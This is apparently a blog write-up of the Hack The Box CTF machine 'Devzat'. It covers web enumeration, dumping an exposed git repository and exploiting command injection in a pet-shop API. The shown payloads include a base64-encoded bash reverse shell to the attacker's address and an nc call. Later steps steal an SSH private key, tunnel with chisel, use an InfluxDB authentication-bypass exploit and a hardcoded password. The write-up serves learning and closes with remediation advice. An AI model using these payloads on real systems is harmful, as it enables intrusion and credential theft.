---
title: "Devzat"
author: "Me"
date: "December 13, 2021"
output: html_document
---

# Devzat

 <div id="boxinfo">
 <div id="textbox">
 <p class="alignleft">**Difficulty**: Medium (?/10)</p>
 <p class="aligncenter">**Type**: CTF</p>
 <p class="alignright">**OS**: Linux</p>
 </div>
 <div style="clear: both;"></div>
 </div> 

<div class="img_container">
![desc]({{https://jsom1.github.io/}}/_images/htb_dz_desc.png){: height="300px" width = 320px"}
</div>

**Ports/services exploited:** 80/http\\
**Tools:** dirb, gobuster, git dumper, git extractor, tcpdump, linpeas, proxychains, chisel\\
**Techniques:** enumeration, port forwarding, ssh tunnelling\\
**Keywords:** Golang (Go), Docker, InfluxDB

**TL;DR**: The host runs a subdomain, which in turn runs a *Go* application. This latter is a pet inventory on which we can add a pet. By enumerating, we find the git repository of this app, which we can retrieve using git dumper and git extractor. In this repo, we have access to the app's Go source code and see that the parameter *species* is vulnerable to command injection. Using Burp, we intercept the request and alter it in order to get a reverse shell. By running linpeas on the machine, we discover there's a docker container running. We can then use *nmap* against it via SSH tunnelling and proxychains, revealing that an InfluxDB is running in the container. The version of InfluxDB (1.7.5) is vunerable to an authentication bypass exploit, giving us access to the database. This database contains credentials that allow us to switch to the user who has the flag. Finally, we discover that the dev version of the app is running locally and contains a special command - which isn't on the prod version - which allows us to read any file on the system.

Let's look on the web if we can find anything about it by searching "influxDB admin 1.7.5 exploit". The first link that comes up looks promising.

## 1. Services enumeration
{:style="color:DarkRed; font-size: 170%;"}

Let's start by enumerating the services and their version that are running on the machine with nmap:

<div class="img_container">
![nmap]({{https://jsom1.github.io/}}/_images/htb_dz_nmap.png)
</div>

We see two instances of SSH and web server. I don't know what's SSH on port 8000 yet, but we'll probably have an answer soon. As usual, we will start by the web server as SSH is rarely if ever exploitable.

## 2. Gaining a foothold
{:style="color:DarkRed; font-size: 170%;"}

Nmap indicated *Did not follow redirect to http://devzat.htb*, indicating we might have to add the IP and hostname to our */etc/hosts*. 
We get the confirmation by browsing to *http://10.10.11.118*: we see the URL became *devzat.htb*, and the website was not found. We resolve this issue with the following command:

````
sudo echo "10.10.11.118 devzat.htb" >> /etc/hosts
`````

Now, the domain name should be mapped with the IP address and the page should render correctly:

<div class="img_container">
![site]({{https://jsom1.github.io/}}/_images/htb_dz_site1.png){: height=80px" width = 100px"}
</div>

Apparently, it offers a way to chat with any device that has an SSH client. There are other interesting information on the page, such as:

- A username and email address (patrick@devzat.htb)
- Patrick did the site design using HTML5 UP
- The chat is developed in its own branch and aside from the stable release
- The app is located into one folder only
- "*The app is of high quality, coded by me personally. So it has to be good, trust me*". That's probably a note from Patrick, and it's more funny than useful. Patrick either is a very good developer or has a very high self-esteem.

There's also an instruction for testing the chat:

<div class="img_container">
![site2]({{https://jsom1.github.io/}}/_images/htb_dz_site2.png)
</div>

So this is what the second instance of SSH on port 8000 is. We see it's *SSH-2.0-Go*, which might be helpful later.\\
Let's try the command and see what happens:

````
ssh -l [username] devzat.htb -p 8000
`````
<div class="img_container">
![app test]({{https://jsom1.github.io/}}/_images/htb_dz_chat.png)
</div>

Oh, this is really cool! Unfortunately I'm alone and nobody is going to reply, but I wanted to input something to see what would happen. 
After exiting, I thought we could maybe issue some commands such as *ls* and connected back to the chat to try it:

<div class="img_container">
![app test2]({{https://jsom1.github.io/}}/_images/htb_dz_chat2.png)
</div>

This time, it's a little bit different, and we see the last connection as well as the chat history. 
I didn't see at first the *run /help to see what you can do*, so I issued a *ls* as intended. In return, we get a list of commands and a message indicating this is not a shell.
By running the */help* command, we discover the app is on Github (github.com/quackduck/devzat). Let's head there to see how it's organized:

<div class="img_container">
![github page]({{https://jsom1.github.io/}}/_images/htb_dz_gh.png){: height=80px" width = 100px"}
</div>

The first thing I noticed here is that there are 3 branches, although the website mentionned two. These are: *main*, *patch-1* and *v2*. We are currently on *main*, which is most likely the stable release. We see the app is mostly written in *Go* (98.8%) and in shell (1.2%). Given the fact that there are 10 contributors, that it's roughly 7 months old and the application itself, it wasn't built just to be used in a HtB machine. Therefore, the stable release is probably safe and if it is this version that is running on the machine, it might not be the way to a foothold...\\
However, it was mentionned that "The chat is developed in its own branch and aside from the stable release". Therefore, it's possible that it's a development version running, and that it contains vulnerabilities on purpose. Let's look at the other branches to see if something stands out. It's not the case.

Let's get back to the website and look for additional clues there. In particular, we will run *dirb* to find other directories:

````
sudo dirb http://devzat.htb -r
`````

*Dirb* found */assets*, */images*, */javascript* and */server-status*. The first one (*/assets*) contains 4 subfolders (*css*, *js*, *sass* and *webfonts*), but there's nothing interesting. The only other directory that we can access is */images*, and there's nothing there either. Let's try with *gobuster* as well:

````
sudo dirb gobuster dir -u http://devzat.htb/ -w /usr/share/wordlists/dirb/big.txt
`````

*Gobuster* found two additional directories, */.htaccess* and */.htpasswd*, but none of them are accessible.\\
To be sure I wasn't going in the wrong direction, I launched a full TCP scan with the following command:

````
sudo nmap -p- 10.10.11.118
`````

There could have been another service running on a higher port, but it is not the case. I also made sure there wasn't any existing exploits for html5up, SSH-2.0 and even Go. So, we have to find something on the website or within the chat application itself...

Sometimes subdomains can be used as a testing environment, and it coud be the case here. We will use **ffuf** to find potential subdomains:

```
sudo ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://devzat.htb/ -H "Host: FUZZ.devzat.htb" -t 200 -fl 10
`````

<div class="img_container">
![ffuf]({{https://jsom1.github.io/}}/_images/htb_dz_ffuf.png)
</div>

Interesting, it found a subdomain: *pets.devzat.htb*. Let's add it to our hosts file:

````
sudo echo "10.10.11.118 pets.devzat.htb" >> /etc/hosts
````

and browse to it:

<div class="img_container">
![pet]({{https://jsom1.github.io/}}/_images/htb_dz_pet.png)
</div>
 
This has nothing to do with the application, but it's definitely a good find. By scrolling down the page, we see we can create another entry in the list:
 
<div class="img_container">
![pet 2]({{https://jsom1.github.io/}}/_images/htb_dz_pet2.png)
</div>

Since we can input text on the page (as the pet's name), there are a few things we can check. For example, does this application parses XML? If it were the case, it could be vulnerable to XXE injection. Or also, is user input sanitized? Unsanitized user input is a trigger of many vulnerabilies, such as SSRF, CSRF, XSS, SQL injections, and so on... We see in the image I added a cat and entered a javascript command as its name. If by refreshing the page a windows pops up, that would mean it might be vulnerable to XSS (it's not the case here). To learn more about how the application handles our input, we can start by inspecting the page by right clicking on it > inspect element. In the debugger tab, we see a few java scripts and references to an api (*/api/pet*):

<div class="img_container">
![Inspect page]({{https://jsom1.github.io/}}/_images/htb_dz_inspect.png){: height=250px" width = 400px"}
</div>

We also see *App.svelte*, and we can learn more about this latter with a quick Google search:

"*Svelte is a radical new approach to building user interfaces. Whereas traditional frameworks like React and Vue do the bulk of their work in the browser, Svelte shifts that work into a compile step that happens when you build your app.\\
Instead of using techniques like virtual DOM diffing, Svelte writes code that surgically updates the DOM when the state of your app changes."*

In other words, it's a tool to develop web applications. Let's search for any existing *Svelte* vulnerability. We find nothing on Metasploit (*searchsploit svelte*), but Googling *Svelte exploit* returns a promising link (https://snyk.io/vuln/npm:svelte).\\
Apparently, **svelte < 2.9.8 is vulnerable to XSS**.\\
More precisely, *spread attributes in the ssr files are unsanitized and can therefore be attack vectors for untrusted user input.*.

Let's quickly review the 3 types of XSS:

- Stored XSS: when the exploit payload is stored in a database, or cached by a server. The application then retrieves this payload and shows it to anyone that views/refresh the page. Therefore, it can attack all users of the site. This kind of vulnerability often exists in forum software (comment sections or product reviews for example).
- Reflected XSS: the payload is in a crafted request or a link. The application takes this value and places it into the page content. Therefore, it only affects the person submitting the request or viewing the link. Reflected XSS often occur in search fields and results, and anywhere user input is included in error messages.
- DOM-based XSS: similar to the previous two, but they take place within the page's Document Object Model (DOM). This happens because the browser parses the page's HTML content and generates an internal DOM representation. JavaScript can interact with this DOM. DOM-based XSS occurs when a page's DOM is modified with user-controller values, and it can either be sored or reflected. The difference is that DOM-based XSS occur when a browser parses the page's content and inserted JavaScript is executed. 

So, we don't know what version of Svelte is running, but we can still try to see if the application is vulnerable to XSS. We can identify XSS vulnerabilities by inputting special characters in input fields. The idea is to see if any of those special characters return unfiltered, which would mean that user input isn't properly sanitized.\\

The most common special characters are the following:

````
< > ' " { } ;
`````

Why those? Because HTML uses "<" and ">" to denote elements. JavaScript uses "{" and "}" in function declarations. Single and double quotes are used to denote strings and finally, semicolons are used to mark the end of a statement. So, if the application doesn't remove or encode these characters, it may be vulnerable to XSS.\\
The most common encodings are HTML and URL encodings. URL encoding is also referred to as percent encoding and is used to convert non-ASCII characters in URLS. For example, a *space* is encoded into *%20*. HTML encoding is used to display characters that normally have special meanings, such as tag elements. For example, "<" is encoded as *&lt;*. When the browser encounters this latter, it doesn't interpret it as the start of an element, but displays the character as-is.

The location where our input is being included affects the type of character we have to use. If it's added between *div* tags, we have to include our own script tags, and we're not able to use "<" and ">" in our payload. If the payload is inserted into an existing JavaScript tag, we might only need quotes and semicolons. Unfortunately, we don't have access to the underlying code and have to test until we find something that works.\\
In the previous image, I inputted a typical JavaScript XSS payload. However, nothing happens when we refresh the page...

Let's submit this payload again and use Burp to get more information:

<div class="img_container">
![Burp]({{https://jsom1.github.io/}}/_images/htb_dz_burp.png)
</div>

Note that I already sent the payload to the repeater and sent the request so that we see the response. We see our payload is:

````
{
  "name":"<script>alert('test')</script>"
}
`````

This input is then sent as a POST request to /api/pet. In the response, we see it was added successfully on *my genious go pet server*. Also, the Content-Type is set to text/plain, and it's not harmful... It's simply rendered as simple text by the browser. It would be vulnerable if it was *text/html*.\\

After trying a lot of different inputs without success, I thought about checking this subdomain for other directories:

````
sudo dirb http://pets.devzat.htb -r
`````

<div class="img_container">
![dirb]({{https://jsom1.github.io/}}/_images/htb_dz_dirb.png)
</div>

So, there are */.git/HEAD*, */build*, */css* and */server-status*. */css* contains parameters for the site's layout, so it's not very interesting. */server-status* returns code 403 and isn't accessible. */.git/HEAD* returns "*ref: refs/heads/master*", and */build* contains 2 scripts: *main.js* and *main.js.map*. In the first line of the latter, we see *{"version":3}*, and this might be the version of Svelte (so it's maybe not vulnerable to XSS). 

By replacing */.git/HEAD* by */.git/refs/heads/master*, we see the following:

<div class="img_container">
![hash]({{https://jsom1.github.io/}}/_images/htb_dz_hash.png)
</div>

I copied this text and used an online hash analyzer to detect the type of hash, which is possibly SHA1. However, no tools can decode it. Anyways, I don't think this is important, because this looks like a commit's hash.\\
By default, *dirb* uses the *common.txt* wordlist. Let's use it again but with another wordlist, for example *big.txt*:

````
sudo dirb http://pets.devzat.htb /usr/share/wordists/dirb/big.txt
`````

Unfortunately, it didn't find anything else. After trying with other wordlists, I found one that returned a few new directories: */usr/share/seclists/Discovery/Web-Content/common.txt*. It returns for example */.git*, */.git/config*, and so on. When dirb found */.git/HEAD*, I didn't even think about visiting */.git*... By doing so, we see the following:

<div class="img_container">
![dirb directories]({{https://jsom1.github.io/}}/_images/htb_dz_direct.png)
</div>

- */COMMIT_EDITMSG*: there's a message saying "back again to localhost only"
- */branches*: blank page
- */config*: nothing interesting
- */description*: "unnamed repository; edit this file 'description' to name the repository"
- ...
- */logs*: contains commit logs of the HEAD and master branches

After doing some research on the web, I found a tool to dump a git repository from a website (https://github.com/internetwache/GitTools). It says "*This tool can be used to download as much as possible from the found .git repository from webservers which do not have directory listing enabled*. This sounds promising... This tool isn't installed on Kali by default, so we must first install it:

````
sudo git clone http://github.com/internetwache/GitTools GitTools
`````
This command clones the repository in a folder called "GitTools". We can now use it with the given syntax:

````
sudo bash GitTools/Dumper/gitdumper.sh http://pets.devzat.htb/.git gitpet
````

This will dump what it can from the given website into a directory called "gitpet":

<div class="img_container">
![git dumper]({{https://jsom1.github.io/}}/_images/htb_dz_gitdumper.png)
</div>

It is said in the tool's github repo that *git Extractor* can be used in combination with *Git Dumper* in case the downloaded repository is incomplete. Let's try that:

````
sudo bash GitTools/Extractor/extractor.sh /gitpet gitpetextr
````
Let's see in *gitpetextr* what it was able to recover:

<div class="img_container">
![dumped commits]({{https://jsom1.github.io/}}/_images/htb_dz_commits.png)
</div>

There's a username and URL in *go.mod*, *git.devzat.htb/catherine/petshop*. But there's something more interesting in *main.go*:

````
func loadCharacter(species string) string {
        cmd := exec.Command("sh", "-c", "cat characteristics/"+species)
        stdoutStderr, err := cmd.CombinedOutput()
        if err != nil {
                return err.Error()
        }
        return string(stdoutStderr)
}
````

We see the function *loadCharacter* uses *exec.Command()*, and maybe we could use it somehow to execute other commands. Previously, we were trying to use the *name* parameter to inject code. Let's try to add the *species* paramater and issue a command. To do so, we start Burp once again and send the request to the repeater. There, we add *species* and see what happens. Let's try to ping ourselves to see if it works.

<div class="img_container">
![ping]({{https://jsom1.github.io/}}/_images/htb_dz_ping.png)
</div>

Before sending this request, we open *tcpdump* to see the ping:

````
sudo tcpdump -i tun0 icmp
``````

Note that we specify *icmp* to only see ICMP packets.

<div class="img_container">
![ping reception]({{https://jsom1.github.io/}}/_images/htb_dz_pingrec.png)
</div>

Great, it works! So we can very likely get a reverse shell! let's try with the following payload:

```
{
  "name":"test"
  "species":"cat;nc -nv 10.110.14.9 4444"
}
`````

Before sending the request, we must setup a netcat listener on our machine:

````
sudo nc -nlvp 4444
`````

However, we get nothing back... I had to askk for help at this point. We have to encode the payload with the following command:

````
sudo echo -n ‘bash -i >& /dev/tcp/10.10.14.6/9001 0>&1’ | base64
`````
This commands encodes *bash -i >& /dev/tcp/10.10.14.6/9001 0>&1* in base64, returning *YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45LzQ0NDQgMD4mMQ==*. We can use this in the payload, and add * | base64 -d | bash* at the end (*-d* to decode). The payload then becomes:

```
{
  "name":"test"
  "species":"cat;echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45LzQ0NDQgMD4mMQ== | base64 -d | bash"
}
`````
<div class="img_container">
![revsh]({{https://jsom1.github.io/}}/_images/htb_dz_revsh.png)
</div>

And we're finally in as Patrick! It's not shown in the picture, but every character I type in this reverse shell is doubled... It's very annoying, even though the commands work. An explanation I found was that both terminals have stty echo, so we can fix this with the following commands:

````
ctrl+Z
stty -echo
fg
````
It appears the flag is on Catherine's Desktop, and we can't read it as Patrick... We have to find a way to switch user.

## 3. Horizontal privilege escalation
{:style="color:DarkRed; font-size: 170%;"}

In fact, we don't necessarily have to to do a horizontal privesc. If we can find a way to root directly, we will also be able to read the file on Catherine's desktop. Anyways, we start at the same place in either case, which is **enumeration**.

At this point, the "terminal" we have isn't a proper one. The output of commands such as *ls* is messy, and we can't use commands with *sudo* (we get the following error: *sudo: a terminal is required to read the password*). So, let's start by upgrading to a "proper" terminal by connecting with ssh. We can confirm the username by looking at */.ssh/authorized_keys*. There, we see it's *patrick@devzat*. We then copy the private key contained in */.ssh/id_rsa*, and paste it in a file on our kali machine (I called it *id_rsa* too). We can then connect:

````
sudo chmod 600 id_rsa
sudo ssh -i id_rsa patrick@devzat.htb
`````

I personnally find it easier with this terminal, especially when it comes to manual enumeration. I first wanted to see Patrick's permissions with *sudo -l*, but obviously we can't since we don't have his password yet. I didn't find anything by enumerating manually, so let's upload *linpeas.sh* on the machine.

On Kali, we start a Python web server in the directory in which we have *linpeas.sh*:

````
sudo python -m SimpleHTTPServer
`````

This serves a web server on port 8000 by default. Before downloading the script on *devzat*, let's create a *.tmp* directory in */tmp* (so that we can run the script and that it doesn't "spoil" it for other players). Then, From patrick's ssh terminal, we download it as follows:

````
wget http://10.10.14.9:8000/linpeas.sh
`````

We must then make it executable, and finally we can run it:

````
chmod +x linpeas.sh
./linpeas.sh
`````

The output is very lengthy and I always stuggle to find the important information within it... I first found a hashed password but it appeared to be a rabbit hole. Unfortunately, I then had to look at another writeup (even though there shouldn't be any since the box is still active... I'm glad I found something though because I was totally stuck and there was nothing on the forum). Here's what should have triggered my curiosity:

<div class="img_container">
![linpeas]({{https://jsom1.github.io/}}/_images/htb_dz_linpeas.png)
</div>

There's a Docker container running on the machine, with the IP *172.17.0.2*. This latter is connected to *devzat* by the port 8086 (same port on *devzat* and on the container).\\
Ideally, we'd like to know what's running inside this container. We can't issue commands such as *docker container ls* (*Got permission denied while trying to connect to the Docker daemon socket*)... We could theoretically use *nmap* from patrick's terminal, but it isn't installed there. I tried transferring it from Kali but it says *command 'nmap' not found* when I tried to run it, and we can't install it directly from there because we're not root.\\
So, the only way I thik of is **port forwarding**.

I don't know much about it, so I'll follow a guide (https://netsec.ws/?p=278) on **dynamic port forwarding**. We start by installing **proxychains**:

````
sudo apt-get install proxychains
`````

Once installed, we make sure there's a socks4 proxy on 127.0.0.1 followed by an unused port (*cat /etc/proxychains.conf*). In my case, there is indeed *socks4 127.0.0.1 9050*. This is necessary so that proxychains can tunnel the program, in our case *nmap*, through our port forward. Note that after a few tries, I had to replace *9050* in the configuration file by *9999*, since *9050* was already listening.\\
Once this is done, we can connect from Kali to *devzat* with the following command:

````
sudo ssh -i id_rsa -f -N -D 9999 patrick@devzat.htb
`````

Where the options are the following:

- *-i id_rsa*: specifies patick's ssh private key
- *-f*: asks SSH to background immediately upon connection, avoiding the need to open another terminal window to issue the next command.
- *-N*: instructs SSH to not send any remote commands.
- *-D*: the dynamic port to use (specified in the *proxychais.conf* file)

Since we used th *-f* flag, we can issue the next command in the same terminal window. Now, we want to execute *nmap* through this SSH tunnel. Because *nmap* is much slower than normal via proxychains, we will only scan the port *8060* that was mentionned in *linpeas*' output. The command we issue from Kali is the following:

````
sudo proxychains nmap -sTV -n -PN -p 8086 127.0.0.1
`````

Where:

- *-n*: tells nmap to never do reverse DNS
- *-sTV*: TCP connect and version detection scan

So this commands sends *the nmap* command through the tunnel, and *devzat* executes it against the docker container running locally. The output is then sent back to us. The two commands above and the result is the following:

<div class="img_container">
![proxychains]({{https://jsom1.github.io/}}/_images/htb_dz_proxy.png)
</div>

Finally, we see the container is running *influxDB*. From Wikipedia, *"InfluxDB is an open-source time series database (TSDB) developed by the company InfluxData. It is written in the Go programming language for storage and retrieval of time series data in fields such as operations monitoring, application metrics, Internet of Things sensor data, and real-time analytics"*. 

There's nothing about it on Metasploit (*searchsploit influxdb*), but there are many promising links that appear if we search for "influxdb admin 1.7.5" on the web. In short, here's a description of the vulnerability:\\
"*InfluxDB before 1.7.6 has an authentication bypass vulnerability in the authenticate function in services/httpd/handler.go because a JWT token may have an empty SharedSecret (aka shared secret)*".

The first link is a github repo which contains a python script for this vulnerability. It is stated that "*Exploit check if server is vulnerable, then it tries to get a remote query shell. It has built in a username bruteforce service.*". We start by cloning it and installing the required dependencies:

````
sudo git clone https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933.git influxexploitgit
cd influxexploitgit
sudo pip install -r requirements.txt
`````

The usage is then *python __main__.py*. The script uses *127.0.0.1* and *8086* by default, and we have to run it on *devzat*. I tried sending the command in the SSH tunnel, but it doesn't work (*sudo proxychains python3 __main.py__*). The problem seems to be related to DNS. I tried making it work for a few hours, before looking at another writeup. It's a little bit frustratring, but the person uses another tool in the writeup and in the end, it's a good opportunity to learn about a new one.\\
So, let's try to use **chisel**, which is described as a "*package that contains a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. It contains single executable including both client and server. Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network.*".

We start by installing it:

````
sudo apt install chisel
`````

We then have to transfer it from Kali to *devzat*. To do so, we start a python web server on Kali (*sudo python -m SimpleHTTPServer*), and download it from *devzat* (*wget http://10.10.14.9:8000/chisel*). Finally, we make it executable with *chmod +x chisel*.

Once it's installed, we open the tunnel on Kali:

````
sudo chisel server -p 9090 --reverse
`````

And "connect" to it from *devzat*:

````
./chisel client 10.10.14.9:9090 R:8086:127.0.0.1:8086
`````

Finally, we open another terminal window, and run the python script:

````
sudo python3 __main__.py
`````


<div class="img_container">
![exploit]({{https://jsom1.github.io/}}/_images/htb_dz_exploit.png)
</div>

When we run the script, we're asked for host, port and wordlist. We can simply press enter for host and port (127.0.0.1 / 8086 by default), and I used */usr/share/dirb/wordlists/common.txt* for the wordlist). The scripts bruteforces usernames and detects if the host is vulnerable.\\
Then, if it is vulnerable, it lists the available databases. We can connect to one of those and use InfluxQL (Influx query language) to query additional information:

<div class="img_container">
![exploit res]({{https://jsom1.github.io/}}/_images/htb_dz_res.png)
</div>

Warning: I spend a lot of time on InfluxQL syntax, because I had errors that seemed to be related to encoding. I was using *SELECT \* FROM user* (as in the image above) and got "*error parsing query: found \u00c2\u00a0, expected identifier, string, number, bool at line 1, char 7*". It turned out that it was because of my \*... I copied one I found on the web and pasted it in the command instead of typing it myself, and it worked.

We see two "new" users, wilhelm and charles. What's really interesting though is that we find a password for Catherine. Let's try to switch to her account with it. From our SSH terminal as Patrick, we type:

````
su catherine
`````
And provide the discovered password. 

<div class="img_container">
![user flag]({{https://jsom1.github.io/}}/_images/htb_dz_usr.png)
</div>

That was painful, but we finally have the user flag!

## 4. Vertical privilege escalation
{:style="color:DarkRed; font-size: 170%;"}

The first thing I wanted to do was the usual *sudo -l* since we have catherine's password, however she isn't allowed to run sudo. Let's run *linpeas* once again (the box had been resetted and I had to reupload it). Catherine can't do it, so it is necessary to log back as patrick, upload it, and *su catherine*).\\
I'm still pretty bad at privilege escalation and struggle to spot the interesting things in the output. I had to look for help and apparently, we have to look at writable files. Here's *linpeas*' output regarding them:

<div class="img_container">
![backups]({{https://jsom1.github.io/}}/_images/htb_dz_backups.png)
</div>

I didn't even pay attention to that because there's no color in the output... I usually first look at what's red, then yellow and green. Anyways, we see here 2 backups files foor *devzat*. We can't do much with them here, so let's copy them in a newly created */tmp/.backups* directory (we can't copy them in */.tmp* because we created this directory on patrick's account) and look at their content:

````
cd /var/backups/
mkdir /tmp/.backups/
cp *.zip /tmp/.backups/
cd /tmp/.backups/
`````

And we can extract the files with *unzip devzat-dev.zip* and *unzip devzat-main.zip*. Let's focus on the dev version, more particularly on *dev/commands.go* (*dev/commands.go*). There, there's a promising looking function to read files, as well as a cleartext password:

````
func fileCommand(u *user, args []string) {
        if len(args) < 1 {
                u.system("Please provide file to print and the password")
                return
        }

        if len(args) < 2 {
                u.system("You need to provide the correct password to use this function")
                return
        }

        path := args[0]
        pass := args[1]

        // Check my secure password
        if pass != "CeilingCatStillAThingIn2021?" {
                u.system("You did provide the wrong password")
                return
        }
````

We see we have to provide a file to read and the password. This function is used in the *file* command on the *devzat* app, which is defined as: *commandInfo{"file", "Paste a files content directly to chat \[alpha\]", fileCommand, 1, false, nil}*. After connecting back to *devzat* (*ssh -l catherine  devzat.htb -p 8000*), I saw the command isn't there. After looking into *main/commands.go*, I realized it's only in dev... Maybe the dev version is running locally? Let's see what ports are openend:

````
netstat -tulpn
``````

<div class="img_container">
![netstat]({{https://jsom1.github.io/}}/_images/htb_dz_netstat.png)
</div>

Port 53 is DNS, 8086 is the port used to communicate with the container, 22 is SSH, 8443 we don't know, 5000 we don't know, 8000 and 80 are http. So, it could be one of the two unknown ports. Let's try to use the app with port 8443:

````
ssh -l catherine devzat.htb -p 8443
`````

<div class="img_container">
![root]({{https://jsom1.github.io/}}/_images/htb_dz_root.png)
</div>

And it worked! We see a conversation between Patrick and Catherine confirming the new feature has been implemented, and Patrick says how to use it and where to get the password (even though we already have it). It was probably intended to be the other way around: first connect to to local dev instance, find this information and then look into the backups. Anyways, we can read any files now and that's how we get root.

<div class="img_container">
![pwn]({{https://jsom1.github.io/}}/_images/htb_dz_pwn.png){: height="380px" width = 390px"}
</div>


<ins>**My thoughts**</ins>

Well, I had a hard but great time on this box! The lesson I learned is to first enumerate all the attack surface. I often quickly find something that looks promising and focus on that only. Most of time, it's a dead end and I lost a lot of time.\\
This box was a great opportunity to practice with SSH tunnelling and port forwarding. I still don't know why I wasn't able to execute the python exploit with Proxychains... Moreover, I learned a few new tools such as git dumper, git extractor and chisel.

<ins>**Fix the vulnerabilities**</ins>

As most of the time with web applications, user input should be sanitized. Regarding the container, the version of InfluxDB should be upgraded to > 1.7.5, which would prevent the exploitation. Finally, having a dev version of the app running locally is fine, however there shouldn't be plain text passwords in configuration files and/or scripts. There could also be some restrictions regarding the files a user can read on *devzat* in dev.
